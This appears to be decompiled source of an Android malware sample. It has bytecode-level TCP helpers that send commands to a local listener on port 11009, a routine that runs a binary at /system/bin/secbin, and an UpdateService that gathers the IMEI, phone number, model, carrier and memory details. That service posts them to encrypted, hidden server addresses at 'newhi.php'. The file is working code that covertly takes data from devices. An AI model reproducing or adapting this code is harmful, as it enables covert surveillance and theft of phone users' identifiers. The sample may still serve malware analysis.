    public static class TCP {
        public static final int PORT = 11009;

        public static final String SERVER = "localhost";

        public static boolean execute(String param1String) {
            // Byte code:
            //   0: aconst_null
            //   1: astore #4
            //   3: aconst_null
            //   4: astore #6
            //   6: iconst_0
            //   7: istore_3
            //   8: iconst_0
            //   9: istore_2
            //   10: new java/net/Socket
            //   13: dup
            //   14: ldc 'localhost'
            //   16: sipush #11009
            //   19: invokespecial <init> : (Ljava/lang/String;I)V
            //   22: astore #5
            //   24: iload_2
            //   25: istore_1
            //   26: aload #5
            //   28: ifnull -> 127
            //   31: aload #5
            //   33: invokevirtual isConnected : ()Z
            //   36: ifne -> 64
            //   39: aload #5
            //   41: new java/net/InetSocketAddress
            //   44: dup
            //   45: ldc 'localhost'
            //   47: invokestatic getByName : (Ljava/lang/String;)Ljava/net/InetAddress;
            //   50: checkcast java/net/Inet4Address
            //   53: sipush #11009
            //   56: invokespecial <init> : (Ljava/net/InetAddress;I)V
            //   59: ldc 50000
            //   61: invokevirtual connect : (Ljava/net/SocketAddress;I)V
            //   64: iload_2
            //   65: istore_1
            //   66: aload #5
            //   68: invokevirtual isConnected : ()Z
            //   71: ifeq -> 127
            //   74: aload #5
            //   76: invokevirtual getOutputStream : ()Ljava/io/OutputStream;
            //   79: astore #4
            //   81: aload #5
            //   83: invokevirtual getInputStream : ()Ljava/io/InputStream;
            //   86: astore #6
            //   88: aload #4
            //   90: ifnull -> 112
            //   93: aload #4
            //   95: aload_0
            //   96: invokevirtual getBytes : ()[B
            //   99: invokevirtual write : ([B)V
            //   102: aload #4
            //   104: invokevirtual flush : ()V
            //   107: aload #4
            //   109: invokevirtual close : ()V
            //   112: iload_2
            //   113: istore_1
            //   114: aload #6
            //   116: ifnull -> 127
            //   119: ldc2_w 5000
            //   122: invokestatic sleep : (J)V
            //   125: iconst_1
            //   126: istore_1
            //   127: aload #5
            //   129: ifnull -> 210
            //   132: aload #5
            //   134: invokevirtual close : ()V
            //   137: iload_1
            //   138: ireturn
            //   139: astore #5
            //   141: aload #6
            //   143: astore_0
            //   144: aload_0
            //   145: astore #4
            //   147: aload #5
            //   149: invokevirtual printStackTrace : ()V
            //   152: iload_3
            //   153: istore_1
            //   154: aload_0
            //   155: ifnull -> 137
            //   158: aload_0
            //   159: invokevirtual close : ()V
            //   162: iconst_0
            //   163: ireturn
            //   164: astore_0
            //   165: iconst_0
            //   166: ireturn
            //   167: astore_0
            //   168: aload #4
            //   170: ifnull -> 178
            //   173: aload #4
            //   175: invokevirtual close : ()V
            //   178: aload_0
            //   179: athrow
            //   180: astore_0
            //   181: iload_1
            //   182: ireturn
            //   183: astore #4
            //   185: goto -> 178
            //   188: astore_0
            //   189: aload #5
            //   191: astore #4
            //   193: goto -> 168
            //   196: astore_0
            //   197: aload #5
            //   199: astore #4
            //   201: aload_0
            //   202: astore #5
            //   204: aload #4
            //   206: astore_0
            //   207: goto -> 144
            //   210: iload_1
            //   211: ireturn
            // Exception table:
            //   from	to	target	type
            //   10	24	139	java/io/IOException
            //   10	24	167	finally
            //   31	64	196	java/io/IOException
            //   31	64	188	finally
            //   66	88	196	java/io/IOException
            //   66	88	188	finally
            //   93	112	196	java/io/IOException
            //   93	112	188	finally
            //   119	125	196	java/io/IOException
            //   119	125	188	finally
            //   132	137	180	java/lang/Exception
            //   147	152	167	finally
            //   158	162	164	java/lang/Exception
            //   173	178	183	java/lang/Exception
        }

        public static boolean isListened() {
            // Byte code:
            //   0: aconst_null
            //   1: astore_3
            //   2: aconst_null
            //   3: astore #6
            //   5: iconst_0
            //   6: istore_1
            //   7: iconst_0
            //   8: istore_0
            //   9: new java/net/Socket
            //   12: dup
            //   13: ldc 'localhost'
            //   15: sipush #11009
            //   18: invokespecial <init> : (Ljava/lang/String;I)V
            //   21: astore #4
            //   23: aload #4
            //   25: ifnull -> 85
            //   28: aload #4
            //   30: invokevirtual isConnected : ()Z
            //   33: ifne -> 61
            //   36: aload #4
            //   38: new java/net/InetSocketAddress
            //   41: dup
            //   42: ldc 'localhost'
            //   44: invokestatic getByName : (Ljava/lang/String;)Ljava/net/InetAddress;
            //   47: checkcast java/net/Inet4Address
            //   50: sipush #11009
            //   53: invokespecial <init> : (Ljava/net/InetAddress;I)V
            //   56: ldc 50000
            //   58: invokevirtual connect : (Ljava/net/SocketAddress;I)V
            //   61: aload #4
            //   63: invokevirtual isConnected : ()Z
            //   66: istore_2
            //   67: iload_2
            //   68: ifeq -> 73
            //   71: iconst_1
            //   72: istore_0
            //   73: aload #4
            //   75: ifnull -> 158
            //   78: aload #4
            //   80: invokevirtual close : ()V
            //   83: iload_0
            //   84: ireturn
            //   85: iconst_1
            //   86: istore_0
            //   87: goto -> 73
            //   90: astore #5
            //   92: aload #6
            //   94: astore #4
            //   96: aload #4
            //   98: astore_3
            //   99: aload #5
            //   101: invokevirtual printStackTrace : ()V
            //   104: iload_1
            //   105: istore_0
            //   106: aload #4
            //   108: ifnull -> 83
            //   111: aload #4
            //   113: invokevirtual close : ()V
            //   116: iconst_0
            //   117: ireturn
            //   118: astore_3
            //   119: iconst_0
            //   120: ireturn
            //   121: astore #4
            //   123: aload_3
            //   124: ifnull -> 131
            //   127: aload_3
            //   128: invokevirtual close : ()V
            //   131: aload #4
            //   133: athrow
            //   134: astore_3
            //   135: iload_0
            //   136: ireturn
            //   137: astore_3
            //   138: goto -> 131
            //   141: astore #5
            //   143: aload #4
            //   145: astore_3
            //   146: aload #5
            //   148: astore #4
            //   150: goto -> 123
            //   153: astore #5
            //   155: goto -> 96
            //   158: iload_0
            //   159: ireturn
            // Exception table:
            //   from	to	target	type
            //   9	23	90	java/lang/Exception
            //   9	23	121	finally
            //   28	61	153	java/lang/Exception
            //   28	61	141	finally
            //   61	67	153	java/lang/Exception
            //   61	67	141	finally
            //   78	83	134	java/lang/Exception
            //   99	104	121	finally
            //   111	116	118	java/lang/Exception
            //   127	131	137	java/lang/Exception
        }

        public static void startListen() {
            if ((new File("/system/bin/secbin")).exists()) {
                Utils.runsh("/system/bin/secbin", "");
                SystemClock.sleep(1000L);
            }
        }
    }
}

public class UpdateService extends Service {
    private boolean _doSearchReport(String paramString) {
        boolean bool = false;
        ArrayList<BasicNameValuePair> arrayList = new ArrayList();
        arrayList.add(new BasicNameValuePair("imei", this.mImei));
        arrayList.add(new BasicNameValuePair("ch", this.mIdentifier));
        arrayList.add(new BasicNameValuePair("ver", "a11"));
        if (checkPermission()) {
            arrayList.add(new BasicNameValuePair("pm", "1"));
        } else {
            arrayList.add(new BasicNameValuePair("pm", "0"));
        }
        if (this.mOsType != null && !"".equals(this.mOsType))
            arrayList.add(new BasicNameValuePair("ostype", this.mOsType));
        if (this.mOsAPI != null && !"".equals(this.mOsAPI))
            arrayList.add(new BasicNameValuePair("osapi", this.mOsAPI));
        if (this.mMobile != null && !"".equals(this.mMobile))
            arrayList.add(new BasicNameValuePair("mobile", this.mMobile));
        if (this.mModel != null && !"".equals(this.mModel))
            arrayList.add(new BasicNameValuePair("mobilemodel", this.mModel));
        if (this.mOperater != null && !"".equals(this.mOperater))
            arrayList.add(new BasicNameValuePair("netoperater", this.mOperater));
        if (this.mNetType != null && !"".equals(this.mNetType))
            arrayList.add(new BasicNameValuePair("nettype", this.mNetType));
        if (this.mSDMem != null && !"".equals(this.mSDMem))
            arrayList.add(new BasicNameValuePair("sdmemory", this.mSDMem));
        if (this.mAliaMem != null && !"".equals(this.mAliaMem))
            arrayList.add(new BasicNameValuePair("aliamemory", this.mAliaMem));
        HttpPost httpPost = new HttpPost(paramString);
        try {
            httpPost.setEntity((HttpEntity)new UrlEncodedFormEntity(arrayList, "UTF-8"));
            int i = (new DefaultHttpClient()).execute((HttpUriRequest)httpPost).getStatusLine().getStatusCode();
            if (i == 200)
                bool = true;
            return bool;
        } catch (Exception exception) {
            return false;
        }
    }

    private void doSearchReport() {
        updateInfo();
        if (this.mJu6Ad == null) {
            doAdGetParam();
        } else {
            this.mJu6Ad.getAd();
        }
        int i = 0;
        try {
            while (true) {
                int j = StateRes.Servers.length;
                if (i < j) {
                    boolean bool = _doSearchReport(String.valueOf(new String(Utils.decrypt(StateRes.Servers[i]))) + "newhi.php");
                    if (!bool) {
                        i++;
                        continue;
                    }
                }
                return;
            }
        } catch (Exception exception) {
            return;
        }
    }

    private void updateInfo() {
        this.mImei = Utils.PhoneState.getImei((Context)this);
        this.mMobile = Utils.PhoneState.getMobile((Context)this);
        this.mModel = Utils.PhoneState.getModel();
        this.mOsType = Utils.PhoneState.getSDKVersion()[0];
        this.mOsAPI = Utils.PhoneState.getSDKVersion()[1];
        this.mAliaMem = Utils.PhoneState.getAliaMemorySize((Context)this);
        this.mSDMem = Utils.PhoneState.getSDAliaMemory((Context)this);
        this.mNetType = Utils.PhoneState.getConnectType((Context)this);
        this.mOperater = Utils.PhoneState.getNetOperater((Context)this);
    }
}
